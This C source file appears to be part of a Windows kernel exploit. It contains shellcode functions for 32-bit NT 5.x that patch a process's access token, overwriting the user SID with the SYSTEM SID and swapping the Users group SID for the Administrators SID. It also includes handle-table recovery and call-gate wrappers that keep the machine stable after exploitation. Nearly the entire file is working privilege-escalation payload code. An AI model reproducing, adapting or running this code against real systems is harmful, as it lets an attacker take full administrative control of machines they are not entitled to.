#include <windows.h>
#include <winioctl.h>
#include <stdio.h>
#include <tchar.h>
#include <Sddl.h>
#include "KernelArch.h"
#include "KernelExploit.h"


DWORD LocalCopyMemory(PVOID dest, PVOID src, DWORD size)
{
  DWORD i;
  PCHAR pDest = dest, pSrc = src;
  for(i=0; i<size;i++)
	pDest[i]=pSrc[i];

  return size;
}

typedef struct _SID_BUILTIN
{
  UCHAR Revision;
  UCHAR SubAuthorityCount;
  SID_IDENTIFIER_AUTHORITY IdentifierAuthority;
  ULONG SubAuthority[2];

} SID_BUILTIN, *PSID_BUILTIN;

/*
0: kd> dt nt!_SEP_TOKEN_PRIVILEGES
   +0x000 Present          : Uint8B
   +0x008 Enabled          : Uint8B
   +0x010 EnabledByDefault : Uint8B
*/

//#define DOMAIN_ALIAS_RID_ADMINS (0x00000220L) // 544
//#define DOMAIN_ALIAS_RID_USERS  (0x00000221L) // 545

SID_BUILTIN SidLocalAdminGroup  = {1, 2, {0,0,0,0,0,5},{32,DOMAIN_ALIAS_RID_ADMINS}};
SID_BUILTIN SidSystem           = {1, 1, {0,0,0,0,0,5},{18,0}};

PISID FindSID(PSID_AND_ATTRIBUTES firstSid, UINT32 count, ULONG rid)
{
  UINT32 i;
  ULONG lRid;
  PSID_AND_ATTRIBUTES pSidList = firstSid;
  for(i=0; i<count; i++, pSidList++)
  {
    PISID pSid = pSidList->Sid;
	lRid = pSid->SubAuthority[pSid->SubAuthorityCount-1];
	if(lRid == rid)
		return pSid;
  }

  return NULL;
}


UINT32 GetOffsetUint32(PVOID Tok, UINT32 offset)
{
	UINT32 *pCount;
	PCHAR TokChar = (PVOID)Tok;
	TokChar += offset;
	pCount = (UINT32*)TokChar;
	return *pCount;
}

PVOID GetOffsetPtr(PVOID Tok, UINT32 offset)
{
	PVOID* pPtr;
	PCHAR TokChar = (PVOID)Tok;
	TokChar += offset;
	pPtr = (PVOID*)TokChar;
	return (PVOID)*pPtr;
}

/* 32-bit NT 5.x shellcode */
typedef struct _HANDLE_TABLE_ENTRY
{
    PVOID Object;
    LONG NextFreeTableEntry;

} HANDLE_TABLE_ENTRY, *PHANDLE_TABLE_ENTRY;

typedef struct _HANDLE_TABLE 
{
  PHANDLE_TABLE_ENTRY pEntry;
} HANDLE_TABLE, *PHANDLE_TABLE;

/*
 RecoverHandle32():
 - This function takes into account only processes which opened less then 512 fds (total).
 - If the exploit is run from VC++ in Debug mode it might have opened more than 512 fds!!
*/

VOID RecoveryHandle32(PEPROCESS p)
{
  ULONG n = (ULONG)deviceHandle;
  PHANDLE_TABLE pt = GetOffsetPtr(p, TargetHost->Values.ObjTableOffset);
  PHANDLE_TABLE_ENTRY ph = pt->pEntry;
  
  DbgPrint("[-] Table at: %p\n", pt);
  DbgPrint("[-] Entry at: %p\n", ph);

  ph = ph + (n / sizeof(UINT32));

  DbgPrint("[-] Overwriting entry at: %p\n", ph);
  ph->Object = NULL;
  ph->NextFreeTableEntry = 0;
}


VOID UserShellcodeSIDListPatchUserKillMe()
{
  PACCESS_TOKEN tok; 
  PEPROCESS p=NULL,curr=NULL;
  UINT32 sidCount;
  PSID_AND_ATTRIBUTES sidList;
  PISID localUserSid,userSid;

  PsLookupProcessByProcessId((HANDLE)cmdProcessId, &p);
  if(p)
  {
    tok = PsReferencePrimaryToken(p);
    DbgPrint("[-] ShellcodeSIDListPatch - EPROCESS at: %p, Access Token At: %p\r\n", p, tok);
  
    sidCount = GetOffsetUint32(tok, TargetHost->Values.SidListCountOffset);
    DbgPrint("[-] ShellcodeSIDListPatch - sidCount is: %d\n", sidCount);

    sidList = GetOffsetPtr(tok, TargetHost->Values.SidListOffset);
    DbgPrint("[-] ShellcodeSIDListPatch - sidList is: %p\n", sidList);

    userSid=sidList->Sid;
    LocalCopyMemory(userSid, &SidSystem, sizeof(SidSystem));

    localUserSid = FindSID(sidList, sidCount, DOMAIN_ALIAS_RID_USERS);
    DbgPrint("[-] ShellcodeSIDListPatch - localUserSid is: %p\n", localUserSid);

    if(localUserSid != NULL)  // prevent crash if the BUILTIN/Users is not in the list
      LocalCopyMemory(localUserSid, &SidLocalAdminGroup, sizeof(SidLocalAdminGroup));

    PsDereferencePrimaryToken(tok);
  }


  curr = PsGetCurrentProcess();
  RecoveryHandle32(curr);
  ZwTerminateProcess(ZwCurrentProcess(), 0);
  DbgPrint("[-] Crash...\r\n");
  while(1); // lose a CPU, on SMP boxes the system is kept alive
  return;
}


ULONG_PTR __stdcall UserShellcodeSIDListPatchUser4Args(DWORD Arg1, DWORD Arg2, DWORD Arg3, DWORD Arg4)
{
  UserShellcodeSIDListPatchUser();
  return 0;
}

VOID __cdecl UserShellcodeSIDListPatchCallGate()
{
  UserShellcodeSIDListPatchUser();
}



/* 32-bit NT 5.x shellcode */
VOID UserShellcodeSIDListPatchUser()
{
  PACCESS_TOKEN tok; 
  PEPROCESS p=NULL;
  UINT32 sidCount;
  PSID_AND_ATTRIBUTES sidList;
  PISID localUserSid,userSid;

  p = PsGetCurrentProcess();
  
  tok = PsReferencePrimaryToken(p);
  DbgPrint("[-] ShellcodeSIDListPatch - EPROCESS at: %p, Access Token At: %p\r\n", p, tok);

  sidCount = GetOffsetUint32(tok, TargetHost->Values.SidListCountOffset);
  DbgPrint("[-] ShellcodeSIDListPatch - sidCount is: %d\n", sidCount);

  sidList = GetOffsetPtr(tok, TargetHost->Values.SidListOffset);
  DbgPrint("[-] ShellcodeSIDListPatch - sidList is: %p\n", sidList);

  userSid=sidList->Sid;
  LocalCopyMemory(userSid, &SidSystem, sizeof(SidSystem));

  localUserSid = FindSID(sidList, sidCount, DOMAIN_ALIAS_RID_USERS);
  DbgPrint("[-] ShellcodeSIDListPatch - localUserSid is: %p\n", localUserSid);

  if(localUserSid != NULL)  // prevent crash if the BUILTIN/Users is not in the list
    LocalCopyMemory(localUserSid, &SidLocalAdminGroup, sizeof(SidLocalAdminGroup));

  PsDereferencePrimaryToken(tok);
  return;
}





